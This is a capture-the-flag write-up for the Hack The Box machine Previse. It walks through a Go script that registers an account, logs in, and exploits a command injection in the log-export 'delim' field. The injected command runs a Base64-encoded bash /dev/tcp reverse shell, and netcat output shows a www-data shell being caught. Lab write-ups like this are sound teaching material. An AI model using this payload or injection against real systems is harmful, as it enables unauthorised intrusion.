# Hack The Box. Machines. Previse

Machine write-up: https://7rocky.github.io/en/htb/previse

### `foothold.go`

This Go program is used to automate the process of getting a reverse shell on machine Previse.

For that, the program does the following tasks:

1. Register an account with a random username and password
2. Login with the account created
3. Exploit a command injection vulnerability to launch the reverse shell

This process is clearly written in the `main` function:

```go
func main() {
	lhost, lport := os.Args[1], os.Args[2]
	username, password := randString(10), randString(10)
	fmt.Printf("[+] Creating username: '%s', with password: '%s'\n", username, password)

	register(username, password)
	fmt.Println("[*] Registration successful")

	cookie := login(username, password)
	fmt.Println("[*] Login successful. Cookie:", cookie)

	sendRevShell(cookie, lhost, lport)
	fmt.Println("[!] Sent reverse shell. Check your nc listener")
}
```

This machine has a misconfiguration on redirects. The server sends the response body even though it is redirecting to `/login.php` (302 Found).

To avoid redirections, we must configure `http.Client` in Go as follows:

```go
var httpClient = &http.Client{
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
	Timeout: time.Second,
}
```

The `Timeout` property is set to exit when the reverse shell gets connected.

Every request in this program is a POST request, which is wrapped on a function called `doPost`:

```go
func doPost(dir, data, cookie string) string {
	req, _ := http.NewRequest("POST", BASE_URL+dir, bytes.NewBufferString(data))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	if cookie != "" {
		req.Header.Set("Cookie", cookie)
	}

	res, err := httpClient.Do(req)

	if err != nil || len(res.Header["Set-Cookie"]) == 0 {
		return ""
	}

	return res.Header["Set-Cookie"][0]
}
```

If there is a cookie, then the cookie is set on the Cookie header. If there is an error (`http.Client.Timeout` for the reverse shell) of if there is no cookie set by the server (Set-Cookie header), then the function returns an empty string. And otherwise, the function returns the cookie set by the server (namely, after the login process).

The functions `register` and `login` are pretty similar:

```go
func register(username, password string) string {
	data := fmt.Sprintf("username=%[1]s&password=%[2]s&confirm=%[2]s", username, password)
	return doPost("/accounts.php", data, "")
}

func login(username, password string) string {
	data := fmt.Sprintf("username=%s&password=%s", username, password)
	return doPost("/login.php", data, "")
}
```

On `register`, the password is specified twice because of confirmation.

The random strings are generated using `randString`, where `CHARS` are all numbers and letters:

```go
func randString(n int) string {
	bytes := make([]byte, n)

	for i := range bytes {
		bytes[i] = CHARS[rand.Intn(len(CHARS))]
	}

	return string(bytes)
}
```

Finally, `sendRevShell` uses `formatRevShell` to encode the payload in Base64, because it usually works most of the time:

```go
func formatRevShell(lhost, lport string) string {
	payload := fmt.Sprintf("bash  -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

func sendRevShell(cookie, lhost, lport string) {
	data := fmt.Sprintf("delim=tab; echo %s | base64 -d | bash", formatRevShell(lhost, lport))
	doPost("/logs.php", data, cookie)
}
```

If we run the program, as follows, we will get a reverse shell using `nc`:

```console
$ go run foothold.go 10.10.17.44 4444
[+] Creating username: 'aBwbf8GZPk', with password: 'LqsgiuEoyV'
[*] Registration successful
[*] Login successful. Cookie: PHPSESSID=t19n77eh9qt1ui2unipsoa6j0b; path=/
[!] Sent reverse shell. Check your nc listener
```

```console
$ nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.104.
Ncat: Connection from 10.10.11.104:53284.
bash: cannot set terminal process group (1418): Inappropriate ioctl for device
bash: no job control in this shell
www-data@previse:/var/www/html$ 
```
